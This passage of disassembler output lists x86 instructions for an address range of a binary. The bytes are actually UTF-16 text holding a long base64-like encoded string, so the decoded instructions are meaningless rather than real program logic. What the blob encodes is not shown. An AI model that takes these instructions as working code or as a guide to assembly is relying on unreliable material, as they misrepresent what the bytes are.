  409b76:	38 00                	cmp    %al,(%eax)
  409b78:	61                   	popa
  409b79:	00 48 00             	add    %cl,0x0(%eax)
  409b7c:	35 00 6d 00 4c       	xor    $0x4c006d00,%eax
  409b81:	00 36                	add    %dh,(%esi)
  409b83:	00 56 00             	add    %dl,0x0(%esi)
  409b86:	54                   	push   %esp
  409b87:	00 6a 00             	add    %ch,0x0(%edx)
  409b8a:	6d                   	insl   (%dx),%es:(%edi)
  409b8b:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  409b8f:	00 72 00             	add    %dh,0x0(%edx)
  409b92:	47                   	inc    %edi
  409b93:	00 35 00 78 00 53    	add    %dh,0x53007800
  409b99:	00 55 00             	add    %dl,0x0(%ebp)
  409b9c:	34 00                	xor    $0x0,%al
  409b9e:	5a                   	pop    %edx
  409b9f:	00 79 00             	add    %bh,0x0(%ecx)
  409ba2:	4d                   	dec    %ebp
  409ba3:	00 2f                	add    %ch,(%edi)
  409ba5:	00 6d 00             	add    %ch,0x0(%ebp)
  409ba8:	48                   	dec    %eax
  409ba9:	00 77 00             	add    %dh,0x0(%edi)
  409bac:	44                   	inc    %esp
  409bad:	00 63 00             	add    %ah,0x0(%ebx)
  409bb0:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  409bb4:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb5:	00 2b                	add    %ch,(%ebx)
  409bb7:	00 38                	add    %bh,(%eax)
  409bb9:	00 4f 00             	add    %cl,0x0(%edi)
  409bbc:	72 00                	jb     0x409bbe
  409bbe:	48                   	dec    %eax
  409bbf:	00 73 00             	add    %dh,0x0(%ebx)
  409bc2:	4a                   	dec    %edx
  409bc3:	00 32                	add    %dh,(%edx)
  409bc5:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409bc9:	00 49 00             	add    %cl,0x0(%ecx)
  409bcc:	58                   	pop    %eax
  409bcd:	00 43 00             	add    %al,0x0(%ebx)
  409bd0:	57                   	push   %edi
  409bd1:	00 4f 00             	add    %cl,0x0(%edi)
  409bd4:	6a 00                	push   $0x0
  409bd6:	35 00 65 00 39       	xor    $0x39006500,%eax
  409bdb:	00 75 00             	add    %dh,0x0(%ebp)
  409bde:	52                   	push   %edx
  409bdf:	00 53 00             	add    %dl,0x0(%ebx)
  409be2:	6f                   	outsl  %ds:(%esi),(%dx)
  409be3:	00 67 00             	add    %ah,0x0(%edi)
  409be6:	4c                   	dec    %esp
  409be7:	00 43 00             	add    %al,0x0(%ebx)
  409bea:	58                   	pop    %eax
  409beb:	00 43 00             	add    %al,0x0(%ebx)
  409bee:	54                   	push   %esp
  409bef:	00 58 00             	add    %bl,0x0(%eax)
  409bf2:	53                   	push   %ebx
  409bf3:	00 4b 00             	add    %cl,0x0(%ebx)
  409bf6:	31 00                	xor    %eax,(%eax)
  409bf8:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  409bfc:	30 00                	xor    %al,(%eax)
  409bfe:	4d                   	dec    %ebp
  409bff:	00 4a 00             	add    %cl,0x0(%edx)
  409c02:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  409c06:	46                   	inc    %esi
  409c07:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  409c0b:	00 39                	add    %bh,(%ecx)
  409c0d:	00 67 00             	add    %ah,0x0(%edi)
  409c10:	66 00 37             	data16 add %dh,(%edi)
  409c13:	00 57 00             	add    %dl,0x0(%edi)
  409c16:	6e                   	outsb  %ds:(%esi),(%dx)
  409c17:	00 41 00             	add    %al,0x0(%ecx)
  409c1a:	41                   	inc    %ecx
  409c1b:	00 76 00             	add    %dh,0x0(%esi)
  409c1e:	4b                   	dec    %ebx
  409c1f:	00 73 00             	add    %dh,0x0(%ebx)
  409c22:	68 00 58 00 32       	push   $0x32005800
  409c27:	00 71 00             	add    %dh,0x0(%ecx)
  409c2a:	4c                   	dec    %esp
  409c2b:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  409c2f:	00 51 00             	add    %dl,0x0(%ecx)
  409c32:	58                   	pop    %eax
  409c33:	00 72 00             	add    %dh,0x0(%edx)
  409c36:	6f                   	outsl  %ds:(%esi),(%dx)
  409c37:	00 30                	add    %dh,(%eax)
  409c39:	00 4d 00             	add    %cl,0x0(%ebp)
  409c3c:	36 00 44 00 42       	add    %al,%ss:0x42(%eax,%eax,1)
  409c41:	00 2b                	add    %ch,(%ebx)
  409c43:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  409c47:	00 52 00             	add    %dl,0x0(%edx)
  409c4a:	7a 00                	jp     0x409c4c
  409c4c:	4a                   	dec    %edx
  409c4d:	00 78 00             	add    %bh,0x0(%eax)
  409c50:	32 00                	xor    (%eax),%al
  409c52:	4e                   	dec    %esi
  409c53:	00 30                	add    %dh,(%eax)
  409c55:	00 6b 00             	add    %ch,0x0(%ebx)
  409c58:	4f                   	dec    %edi
  409c59:	00 49 00             	add    %cl,0x0(%ecx)
  409c5c:	66 00 54 00 39       	data16 add %dl,0x39(%eax,%eax,1)
  409c61:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c64:	2b 00                	sub    (%eax),%eax
  409c66:	44                   	inc    %esp
  409c67:	00 49 00             	add    %cl,0x0(%ecx)
  409c6a:	63 00                	arpl   %eax,(%eax)
  409c6c:	69 00 2b 00 44 00    	imul   $0x44002b,(%eax),%eax
  409c72:	4b                   	dec    %ebx
  409c73:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  409c77:	00 6d 00             	add    %ch,0x0(%ebp)
  409c7a:	72 00                	jb     0x409c7c
  409c7c:	42                   	inc    %edx
  409c7d:	00 6f 00             	add    %ch,0x0(%edi)
  409c80:	30 00                	xor    %al,(%eax)
  409c82:	31 00                	xor    %eax,(%eax)
  409c84:	2b 00                	sub    (%eax),%eax
  409c86:	75 00                	jne    0x409c88
  409c88:	4a                   	dec    %edx
  409c89:	00 4e 00             	add    %cl,0x0(%esi)
  409c8c:	7a 00                	jp     0x409c8e
  409c8e:	31 00                	xor    %eax,(%eax)
  409c90:	47                   	inc    %edi
  409c91:	00 77 00             	add    %dh,0x0(%edi)
  409c94:	67 00 41 00          	add    %al,0x0(%bx,%di)
  409c98:	57                   	push   %edi
  409c99:	00 37                	add    %dh,(%edi)
  409c9b:	00 61 00             	add    %ah,0x0(%ecx)
  409c9e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c9f:	00 37                	add    %dh,(%edi)
  409ca1:	00 42 00             	add    %al,0x0(%edx)
  409ca4:	53                   	push   %ebx
  409ca5:	00 6a 00             	add    %ch,0x0(%edx)
  409ca8:	30 00                	xor    %al,(%eax)
  409caa:	54                   	push   %esp
  409cab:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  409caf:	00 77 00             	add    %dh,0x0(%edi)
  409cb2:	55                   	push   %ebp
  409cb3:	00 55 00             	add    %dl,0x0(%ebp)
  409cb6:	49                   	dec    %ecx
  409cb7:	00 41 00             	add    %al,0x0(%ecx)
  409cba:	74 00                	je     0x409cbc
  409cbc:	43                   	inc    %ebx
  409cbd:	00 78 00             	add    %bh,0x0(%eax)
  409cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  409cc1:	00 62 00             	add    %ah,0x0(%edx)
  409cc4:	59                   	pop    %ecx
  409cc5:	00 49 00             	add    %cl,0x0(%ecx)
  409cc8:	43                   	inc    %ebx
  409cc9:	00 77 00             	add    %dh,0x0(%edi)
  409ccc:	6f                   	outsl  %ds:(%esi),(%dx)
  409ccd:	00 65 00             	add    %ah,0x0(%ebp)
  409cd0:	62 00                	bound  %eax,(%eax)
  409cd2:	4e                   	dec    %esi
  409cd3:	00 6b 00             	add    %ch,0x0(%ebx)
  409cd6:	2b 00                	sub    (%eax),%eax
  409cd8:	54                   	push   %esp
  409cd9:	00 6a 00             	add    %ch,0x0(%edx)
  409cdc:	6c                   	insb   (%dx),%es:(%edi)
  409cdd:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  409ce1:	00 65 00             	add    %ah,0x0(%ebp)
  409ce4:	76 00                	jbe    0x409ce6
  409ce6:	48                   	dec    %eax
  409ce7:	00 6f 00             	add    %ch,0x0(%edi)
  409cea:	4c                   	dec    %esp
  409ceb:	00 6a 00             	add    %ch,0x0(%edx)
  409cee:	51                   	push   %ecx
  409cef:	00 75 00             	add    %dh,0x0(%ebp)
  409cf2:	6d                   	insl   (%dx),%es:(%edi)
  409cf3:	00 4f 00             	add    %cl,0x0(%edi)
  409cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf7:	00 4f 00             	add    %cl,0x0(%edi)
  409cfa:	34 00                	xor    $0x0,%al
  409cfc:	32 00                	xor    (%eax),%al
  409cfe:	71 00                	jno    0x409d00
  409d00:	68 00 4e 00 4e       	push   $0x4e004e00
  409d05:	00 33                	add    %dh,(%ebx)
  409d07:	00 6f 00             	add    %ch,0x0(%edi)
  409d0a:	59                   	pop    %ecx
  409d0b:	00 4d 00             	add    %cl,0x0(%ebp)
  409d0e:	63 00                	arpl   %eax,(%eax)
  409d10:	31 00                	xor    %eax,(%eax)
  409d12:	33 00                	xor    (%eax),%eax
  409d14:	45                   	inc    %ebp
  409d15:	00 67 00             	add    %ah,0x0(%edi)
  409d18:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  409d1c:	33 00                	xor    (%eax),%eax
  409d1e:	56                   	push   %esi
  409d1f:	00 6e 00             	add    %ch,0x0(%esi)
  409d22:	6c                   	insb   (%dx),%es:(%edi)
  409d23:	00 72 00             	add    %dh,0x0(%edx)
  409d26:	4e                   	dec    %esi
  409d27:	00 63 00             	add    %ah,0x0(%ebx)
  409d2a:	76 00                	jbe    0x409d2c
  409d2c:	5a                   	pop    %edx
  409d2d:	00 6e 00             	add    %ch,0x0(%esi)
  409d30:	53                   	push   %ebx
  409d31:	00 37                	add    %dh,(%edi)
  409d33:	00 6b 00             	add    %ch,0x0(%ebx)
  409d36:	76 00                	jbe    0x409d38
  409d38:	6a 00                	push   $0x0
  409d3a:	2f                   	das
  409d3b:	00 39                	add    %bh,(%ecx)
  409d3d:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  409d41:	00 2f                	add    %ch,(%edi)
  409d43:	00 4d 00             	add    %cl,0x0(%ebp)
  409d46:	44                   	inc    %esp
  409d47:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  409d4b:	00 67 00             	add    %ah,0x0(%edi)
  409d4e:	7a 00                	jp     0x409d50
  409d50:	78 00                	js     0x409d52
  409d52:	58                   	pop    %eax
  409d53:	00 33                	add    %dh,(%ebx)
  409d55:	00 6f 00             	add    %ch,0x0(%edi)
  409d58:	74 00                	je     0x409d5a
  409d5a:	45                   	inc    %ebp
  409d5b:	00 4a 00             	add    %cl,0x0(%edx)
  409d5e:	44                   	inc    %esp
  409d5f:	00 68 00             	add    %ch,0x0(%eax)
  409d62:	52                   	push   %edx
  409d63:	00 42 00             	add    %al,0x0(%edx)
  409d66:	53                   	push   %ebx
  409d67:	00 4a 00             	add    %cl,0x0(%edx)
  409d6a:	41                   	inc    %ecx
  409d6b:	00 38                	add    %bh,(%eax)
  409d6d:	00 36                	add    %dh,(%esi)
  409d6f:	00 73 00             	add    %dh,0x0(%ebx)
  409d72:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  409d76:	6e                   	outsb  %ds:(%esi),(%dx)
  409d77:	00 50 00             	add    %dl,0x0(%eax)
  409d7a:	4c                   	dec    %esp
  409d7b:	00 47 00             	add    %al,0x0(%edi)
  409d7e:	78 00                	js     0x409d80
  409d80:	76 00                	jbe    0x409d82
  409d82:	38 00                	cmp    %al,(%eax)
  409d84:	6a 00                	push   $0x0
  409d86:	6d                   	insl   (%dx),%es:(%edi)
  409d87:	00 61 00             	add    %ah,0x0(%ecx)
  409d8a:	78 00                	js     0x409d8c
  409d8c:	2f                   	das
  409d8d:	00 70 00             	add    %dh,0x0(%eax)
  409d90:	50                   	push   %eax
  409d91:	00 57 00             	add    %dl,0x0(%edi)
  409d94:	4e                   	dec    %esi
  409d95:	00 6e 00             	add    %ch,0x0(%esi)
  409d98:	6e                   	outsb  %ds:(%esi),(%dx)
  409d99:	00 39                	add    %bh,(%ecx)
  409d9b:	00 70 00             	add    %dh,0x0(%eax)
  409d9e:	46                   	inc    %esi
  409d9f:	00 56 00             	add    %dl,0x0(%esi)
  409da2:	4d                   	dec    %ebp
  409da3:	00 35 00 78 00 66    	add    %dh,0x66007800
  409da9:	00 4a 00             	add    %cl,0x0(%edx)
  409dac:	5a                   	pop    %edx
  409dad:	00 39                	add    %bh,(%ecx)
  409daf:	00 6b 00             	add    %ch,0x0(%ebx)
  409db2:	34 00                	xor    $0x0,%al
  409db4:	70 00                	jo     0x409db6
  409db6:	55                   	push   %ebp
  409db7:	00 50 00             	add    %dl,0x0(%eax)
  409dba:	76 00                	jbe    0x409dbc
  409dbc:	54                   	push   %esp
  409dbd:	00 45 00             	add    %al,0x0(%ebp)
  409dc0:	59                   	pop    %ecx
  409dc1:	00 33                	add    %dh,(%ebx)
  409dc3:	00 71 00             	add    %dh,0x0(%ecx)
  409dc6:	34 00                	xor    $0x0,%al
  409dc8:	2f                   	das
  409dc9:	00 2f                	add    %ch,(%edi)
  409dcb:	00 52 00             	add    %dl,0x0(%edx)
  409dce:	39 00                	cmp    %eax,(%eax)
  409dd0:	74 00                	je     0x409dd2
  409dd2:	47                   	inc    %edi
  409dd3:	00 69 00             	add    %ch,0x0(%ecx)
  409dd6:	49                   	dec    %ecx
  409dd7:	00 75 00             	add    %dh,0x0(%ebp)
  409dda:	58                   	pop    %eax
  409ddb:	00 4a 00             	add    %cl,0x0(%edx)
  409dde:	52                   	push   %edx
  409ddf:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  409de3:	00 30                	add    %dh,(%eax)
  409de5:	00 42 00             	add    %al,0x0(%edx)
  409de8:	32 00                	xor    (%eax),%al
  409dea:	30 00                	xor    %al,(%eax)
  409dec:	67 00 66 00          	add    %ah,0x0(%bp)
  409df0:	6e                   	outsb  %ds:(%esi),(%dx)
  409df1:	00 37                	add    %dh,(%edi)
  409df3:	00 72 00             	add    %dh,0x0(%edx)
  409df6:	6c                   	insb   (%dx),%es:(%edi)
  409df7:	00 76 00             	add    %dh,0x0(%esi)
  409dfa:	4c                   	dec    %esp
  409dfb:	00 76 00             	add    %dh,0x0(%esi)
  409dfe:	56                   	push   %esi
  409dff:	00 69 00             	add    %ch,0x0(%ecx)
  409e02:	4f                   	dec    %edi
  409e03:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  409e07:	00 55 00             	add    %dl,0x0(%ebp)
  409e0a:	6b 00 79             	imul   $0x79,(%eax),%eax
  409e0d:	00 53 00             	add    %dl,0x0(%ebx)
  409e10:	45                   	inc    %ebp
  409e11:	00 7a 00             	add    %bh,0x0(%edx)
  409e14:	32 00                	xor    (%eax),%al
  409e16:	68 00 68 00 68       	push   $0x68006800
  409e1b:	00 67 00             	add    %ah,0x0(%edi)
  409e1e:	31 00                	xor    %eax,(%eax)
  409e20:	50                   	push   %eax
  409e21:	00 37                	add    %dh,(%edi)
  409e23:	00 2b                	add    %ch,(%ebx)
  409e25:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  409e29:	00 75 00             	add    %dh,0x0(%ebp)
  409e2c:	6e                   	outsb  %ds:(%esi),(%dx)
  409e2d:	00 6e 00             	add    %ch,0x0(%esi)
  409e30:	43                   	inc    %ebx
  409e31:	00 63 00             	add    %ah,0x0(%ebx)
  409e34:	74 00                	je     0x409e36
  409e36:	5a                   	pop    %edx
  409e37:	00 4e 00             	add    %cl,0x0(%esi)
  409e3a:	54                   	push   %esp
  409e3b:	00 32                	add    %dh,(%edx)
  409e3d:	00 39                	add    %bh,(%ecx)
  409e3f:	00 78 00             	add    %bh,0x0(%eax)
  409e42:	2b 00                	sub    (%eax),%eax
  409e44:	32 00                	xor    (%eax),%al
  409e46:	34 00                	xor    $0x0,%al
  409e48:	46                   	inc    %esi
  409e49:	00 58 00             	add    %bl,0x0(%eax)
  409e4c:	4d                   	dec    %ebp
  409e4d:	00 43 00             	add    %al,0x0(%ebx)
  409e50:	62 00                	bound  %eax,(%eax)
  409e52:	42                   	inc    %edx
  409e53:	00 4b 00             	add    %cl,0x0(%ebx)
  409e56:	51                   	push   %ecx
  409e57:	00 2f                	add    %ch,(%edi)
  409e59:	00 57 00             	add    %dl,0x0(%edi)
  409e5c:	44                   	inc    %esp
  409e5d:	00 61 00             	add    %ah,0x0(%ecx)
  409e60:	33 00                	xor    (%eax),%eax
  409e62:	4d                   	dec    %ebp
  409e63:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  409e67:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  409e6b:	00 4b 00             	add    %cl,0x0(%ebx)
  409e6e:	2f                   	das
  409e6f:	00 38                	add    %bh,(%eax)
  409e71:	00 65 00             	add    %ah,0x0(%ebp)
  409e74:	45                   	inc    %ebp
  409e75:	00 43 00             	add    %al,0x0(%ebx)
  409e78:	7a 00                	jp     0x409e7a
  409e7a:	31 00                	xor    %eax,(%eax)
  409e7c:	48                   	dec    %eax
  409e7d:	00 63 00             	add    %ah,0x0(%ebx)
  409e80:	6f                   	outsl  %ds:(%esi),(%dx)
  409e81:	00 36                	add    %dh,(%esi)
  409e83:	00 33                	add    %dh,(%ebx)
  409e85:	00 4d 00             	add    %cl,0x0(%ebp)
  409e88:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  409e8c:	5a                   	pop    %edx
  409e8d:	00 33                	add    %dh,(%ebx)
  409e8f:	00 41 00             	add    %al,0x0(%ecx)
  409e92:	4f                   	dec    %edi
  409e93:	00 71 00             	add    %dh,0x0(%ecx)
  409e96:	42                   	inc    %edx
  409e97:	00 2f                	add    %ch,(%edi)
  409e99:	00 32                	add    %dh,(%edx)
  409e9b:	00 39                	add    %bh,(%ecx)
  409e9d:	00 79 00             	add    %bh,0x0(%ecx)
  409ea0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ea1:	00 37                	add    %dh,(%edi)
  409ea3:	00 41 00             	add    %al,0x0(%ecx)
  409ea6:	45                   	inc    %ebp
  409ea7:	00 5a 00             	add    %bl,0x0(%edx)
  409eaa:	33 00                	xor    (%eax),%eax
  409eac:	56                   	push   %esi
  409ead:	00 52 00             	add    %dl,0x0(%edx)
  409eb0:	2b 00                	sub    (%eax),%eax
  409eb2:	44                   	inc    %esp
  409eb3:	00 33                	add    %dh,(%ebx)
  409eb5:	00 72 00             	add    %dh,0x0(%edx)
  409eb8:	45                   	inc    %ebp
  409eb9:	00 35 00 43 00 62    	add    %dh,0x62004300
  409ebf:	00 6b 00             	add    %ch,0x0(%ebx)
  409ec2:	68 00 57 00 4a       	push   $0x4a005700
  409ec7:	00 50 00             	add    %dl,0x0(%eax)
  409eca:	36 00 33             	add    %dh,%ss:(%ebx)
  409ecd:	00 59 00             	add    %bl,0x0(%ecx)
  409ed0:	46                   	inc    %esi
  409ed1:	00 68 00             	add    %ch,0x0(%eax)
  409ed4:	74 00                	je     0x409ed6
  409ed6:	72 00                	jb     0x409ed8
  409ed8:	53                   	push   %ebx
  409ed9:	00 51 00             	add    %dl,0x0(%ecx)
  409edc:	44                   	inc    %esp
  409edd:	00 6b 00             	add    %ch,0x0(%ebx)
  409ee0:	38 00                	cmp    %al,(%eax)
  409ee2:	4e                   	dec    %esi
  409ee3:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  409ee7:	00 43 00             	add    %al,0x0(%ebx)
  409eea:	62 00                	bound  %eax,(%eax)
  409eec:	78 00                	js     0x409eee
  409eee:	50                   	push   %eax
  409eef:	00 39                	add    %bh,(%ecx)
  409ef1:	00 2f                	add    %ch,(%edi)
  409ef3:	00 49 00             	add    %cl,0x0(%ecx)
  409ef6:	68 00 73 00 6e       	push   $0x6e007300
  409efb:	00 7a 00             	add    %bh,0x0(%edx)
  409efe:	75 00                	jne    0x409f00
  409f00:	4d                   	dec    %ebp
  409f01:	00 48 00             	add    %cl,0x0(%eax)
  409f04:	33 00                	xor    (%eax),%eax
  409f06:	6e                   	outsb  %ds:(%esi),(%dx)
  409f07:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  409f0b:	00 4f 00             	add    %cl,0x0(%edi)
  409f0e:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409f12:	6b 00 36             	imul   $0x36,(%eax),%eax
  409f15:	00 57 00             	add    %dl,0x0(%edi)
  409f18:	39 00                	cmp    %eax,(%eax)
  409f1a:	41                   	inc    %ecx
  409f1b:	00 45 00             	add    %al,0x0(%ebp)
  409f1e:	68 00 46 00 4d       	push   $0x4d004600
  409f23:	00 76 00             	add    %dh,0x0(%esi)
  409f26:	45                   	inc    %ebp
  409f27:	00 41 00             	add    %al,0x0(%ecx)
  409f2a:	45                   	inc    %ebp
  409f2b:	00 66 00             	add    %ah,0x0(%esi)
  409f2e:	73 00                	jae    0x409f30
  409f30:	44                   	inc    %esp
  409f31:	00 32                	add    %dh,(%edx)
  409f33:	00 32                	add    %dh,(%edx)
  409f35:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  409f39:	00 51 00             	add    %dl,0x0(%ecx)
  409f3c:	39 00                	cmp    %eax,(%eax)
  409f3e:	75 00                	jne    0x409f40
  409f40:	7a 00                	jp     0x409f42
  409f42:	57                   	push   %edi
  409f43:	00 77 00             	add    %dh,0x0(%edi)
  409f46:	6d                   	insl   (%dx),%es:(%edi)
  409f47:	00 39                	add    %bh,(%ecx)
  409f49:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f4c:	42                   	inc    %edx
  409f4d:	00 67 00             	add    %ah,0x0(%edi)
  409f50:	41                   	inc    %ecx
  409f51:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  409f55:	00 62 00             	add    %ah,0x0(%edx)
  409f58:	42                   	inc    %edx
  409f59:	00 70 00             	add    %dh,0x0(%eax)
  409f5c:	45                   	inc    %ebp
  409f5d:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  409f61:	00 35 00 4f 00 69    	add    %dh,0x69004f00
  409f67:	00 32                	add    %dh,(%edx)
  409f69:	00 78 00             	add    %bh,0x0(%eax)
  409f6c:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  409f70:	66 00 38             	data16 add %bh,(%eax)
  409f73:	00 38                	add    %bh,(%eax)
  409f75:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  409f79:	00 4b 00             	add    %cl,0x0(%ebx)
  409f7c:	39 00                	cmp    %eax,(%eax)
  409f7e:	63 00                	arpl   %eax,(%eax)
  409f80:	71 00                	jno    0x409f82
  409f82:	42                   	inc    %edx
  409f83:	00 59 00             	add    %bl,0x0(%ecx)
  409f86:	4c                   	dec    %esp
  409f87:	00 52 00             	add    %dl,0x0(%edx)
  409f8a:	42                   	inc    %edx
  409f8b:	00 6e 00             	add    %ch,0x0(%esi)
  409f8e:	38 00                	cmp    %al,(%eax)
  409f90:	52                   	push   %edx
  409f91:	00 48 00             	add    %cl,0x0(%eax)
  409f94:	68 00 50 00 65       	push   $0x65005000
  409f99:	00 43 00             	add    %al,0x0(%ebx)
  409f9c:	52                   	push   %edx
  409f9d:	00 6b 00             	add    %ch,0x0(%ebx)
  409fa0:	2b 00                	sub    (%eax),%eax
  409fa2:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409fa6:	68 00 4e 00 74       	push   $0x74004e00
  409fab:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  409faf:	00 5a 00             	add    %bl,0x0(%edx)
  409fb2:	54                   	push   %esp
  409fb3:	00 5a 00             	add    %bl,0x0(%edx)
  409fb6:	34 00                	xor    $0x0,%al
  409fb8:	47                   	inc    %edi
  409fb9:	00 37                	add    %dh,(%edi)
  409fbb:	00 57 00             	add    %dl,0x0(%edi)
  409fbe:	6c                   	insb   (%dx),%es:(%edi)
  409fbf:	00 52 00             	add    %dl,0x0(%edx)
  409fc2:	70 00                	jo     0x409fc4
  409fc4:	39 00                	cmp    %eax,(%eax)
  409fc6:	50                   	push   %eax
  409fc7:	00 57 00             	add    %dl,0x0(%edi)
  409fca:	57                   	push   %edi
  409fcb:	00 32                	add    %dh,(%edx)
  409fcd:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  409fd1:	00 62 00             	add    %ah,0x0(%edx)
  409fd4:	64 00 2b             	add    %ch,%fs:(%ebx)
  409fd7:	00 6d 00             	add    %ch,0x0(%ebp)
  409fda:	55                   	push   %ebp
  409fdb:	00 69 00             	add    %ch,0x0(%ecx)
  409fde:	62 00                	bound  %eax,(%eax)
  409fe0:	2b 00                	sub    (%eax),%eax
  409fe2:	58                   	pop    %eax
  409fe3:	00 35 00 73 00 4c    	add    %dh,0x4c007300
  409fe9:	00 67 00             	add    %ah,0x0(%edi)
  409fec:	54                   	push   %esp
  409fed:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ff0:	61                   	popa
  409ff1:	00 77 00             	add    %dh,0x0(%edi)
  409ff4:	74 00                	je     0x409ff6
  409ff6:	4f                   	dec    %edi
  409ff7:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  409ffb:	00 45 00             	add    %al,0x0(%ebp)
  409ffe:	4d                   	dec    %ebp
  409fff:	00 71 00             	add    %dh,0x0(%ecx)
  40a002:	44                   	inc    %esp
  40a003:	00 65 00             	add    %ah,0x0(%ebp)
  40a006:	32 00                	xor    (%eax),%al
  40a008:	50                   	push   %eax
  40a009:	00 78 00             	add    %bh,0x0(%eax)
  40a00c:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a010:	63 00                	arpl   %eax,(%eax)
  40a012:	47                   	inc    %edi
  40a013:	00 47 00             	add    %al,0x0(%edi)
  40a016:	77 00                	ja     0x40a018
  40a018:	35 00 69 00 59       	xor    $0x59006900,%eax
  40a01d:	00 38                	add    %bh,(%eax)
  40a01f:	00 62 00             	add    %ah,0x0(%edx)
  40a022:	4e                   	dec    %esi
  40a023:	00 31                	add    %dh,(%ecx)
  40a025:	00 4b 00             	add    %cl,0x0(%ebx)
  40a028:	2b 00                	sub    (%eax),%eax
  40a02a:	76 00                	jbe    0x40a02c
  40a02c:	34 00                	xor    $0x0,%al
  40a02e:	43                   	inc    %ebx
  40a02f:	00 30                	add    %dh,(%eax)
  40a031:	00 69 00             	add    %ch,0x0(%ecx)
  40a034:	33 00                	xor    (%eax),%eax
  40a036:	52                   	push   %edx
  40a037:	00 51 00             	add    %dl,0x0(%ecx)
  40a03a:	41                   	inc    %ecx
  40a03b:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40a03f:	00 69 00             	add    %ch,0x0(%ecx)
  40a042:	48                   	dec    %eax
  40a043:	00 65 00             	add    %ah,0x0(%ebp)
  40a046:	45                   	inc    %ebp
  40a047:	00 6d 00             	add    %ch,0x0(%ebp)
  40a04a:	6a 00                	push   $0x0
  40a04c:	48                   	dec    %eax
  40a04d:	00 48 00             	add    %cl,0x0(%eax)
  40a050:	5a                   	pop    %edx
  40a051:	00 31                	add    %dh,(%ecx)
  40a053:	00 46 00             	add    %al,0x0(%esi)
  40a056:	6c                   	insb   (%dx),%es:(%edi)
  40a057:	00 65 00             	add    %ah,0x0(%ebp)
  40a05a:	5a                   	pop    %edx
  40a05b:	00 53 00             	add    %dl,0x0(%ebx)
  40a05e:	74 00                	je     0x40a060
  40a060:	4f                   	dec    %edi
  40a061:	00 6e 00             	add    %ch,0x0(%esi)
  40a064:	63 00                	arpl   %eax,(%eax)
  40a066:	44                   	inc    %esp
  40a067:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40a06b:	00 38                	add    %bh,(%eax)
  40a06d:	00 7a 00             	add    %bh,0x0(%edx)
  40a070:	52                   	push   %edx
  40a071:	00 5a 00             	add    %bl,0x0(%edx)
  40a074:	63 00                	arpl   %eax,(%eax)
  40a076:	6f                   	outsl  %ds:(%esi),(%dx)
  40a077:	00 71 00             	add    %dh,0x0(%ecx)
  40a07a:	72 00                	jb     0x40a07c
  40a07c:	47                   	inc    %edi
  40a07d:	00 43 00             	add    %al,0x0(%ebx)
  40a080:	42                   	inc    %edx
  40a081:	00 55 00             	add    %dl,0x0(%ebp)
  40a084:	68 00 4d 00 71       	push   $0x71004d00
  40a089:	00 46 00             	add    %al,0x0(%esi)
  40a08c:	4f                   	dec    %edi
  40a08d:	00 59 00             	add    %bl,0x0(%ecx)
  40a090:	73 00                	jae    0x40a092
  40a092:	67 00 4d 00          	add    %cl,0x0(%di)
  40a096:	58                   	pop    %eax
  40a097:	00 58 00             	add    %bl,0x0(%eax)
  40a09a:	75 00                	jne    0x40a09c
  40a09c:	38 00                	cmp    %al,(%eax)
  40a09e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a09f:	00 6e 00             	add    %ch,0x0(%esi)
  40a0a2:	4c                   	dec    %esp
  40a0a3:	00 47 00             	add    %al,0x0(%edi)
  40a0a6:	68 00 64 00 5a       	push   $0x5a006400
  40a0ab:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a0af:	00 57 00             	add    %dl,0x0(%edi)
  40a0b2:	6a 00                	push   $0x0
  40a0b4:	73 00                	jae    0x40a0b6
  40a0b6:	78 00                	js     0x40a0b8
  40a0b8:	41                   	inc    %ecx
  40a0b9:	00 65 00             	add    %ah,0x0(%ebp)
  40a0bc:	35 00 74 00 67       	xor    $0x67007400,%eax
  40a0c1:	00 58 00             	add    %bl,0x0(%eax)
  40a0c4:	48                   	dec    %eax
  40a0c5:	00 2b                	add    %ch,(%ebx)
  40a0c7:	00 6d 00             	add    %ch,0x0(%ebp)
